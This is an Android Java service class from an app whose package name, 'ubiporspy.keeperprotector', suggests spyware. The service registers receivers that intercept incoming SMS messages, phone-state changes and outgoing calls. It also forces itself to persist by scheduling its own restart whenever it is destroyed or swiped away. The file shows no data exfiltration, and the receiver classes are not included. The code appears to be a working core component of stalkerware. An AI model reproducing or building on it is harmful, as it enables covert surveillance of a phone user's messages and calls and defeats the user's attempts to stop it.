package com.ubiporspy.keeperprotector.main.services;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.os.SystemClock;
import android.support.annotation.Nullable;

import com.ubiporspy.keeperprotector.main.broadcasts.BroadcastCastCallMain;
import com.ubiporspy.keeperprotector.main.broadcasts.BroadcastSms;

public class MainService extends Service {

    private final BroadcastSms broadcastSms = new BroadcastSms();
    private final BroadcastCastCallMain broadcastCastCallMain = new BroadcastCastCallMain();

    @Override
    public void onCreate() {
        super.onCreate();
        registerMyReceiver();
    }

    @Override
    public void onDestroy() {
        restart();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        restart();
    }

    private void restart() {
        Intent restartService = new Intent(getApplicationContext(),
                this.getClass());
        restartService.setPackage(getPackageName());
        PendingIntent restartServicePI = PendingIntent.getService(
                getApplicationContext(), 1, restartService,
                PendingIntent.FLAG_ONE_SHOT);

        AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 100, restartServicePI);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return Service.START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void registerMyReceiver() {
        IntentFilter filterTelephone = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(broadcastSms, filterTelephone);
        IntentFilter filterPhoneState = new IntentFilter("android.intent.action.PHONE_STATE");
        registerReceiver(broadcastCastCallMain, filterPhoneState);
        IntentFilter filterCall = new IntentFilter("android.intent.action.NEW_OUTGOING_CALL");
        registerReceiver(broadcastCastCallMain, filterCall);
    }

    private void unregisterMyReceiver() {
        unregisterReceiver(broadcastSms);
        unregisterReceiver(broadcastCastCallMain);
    }
}
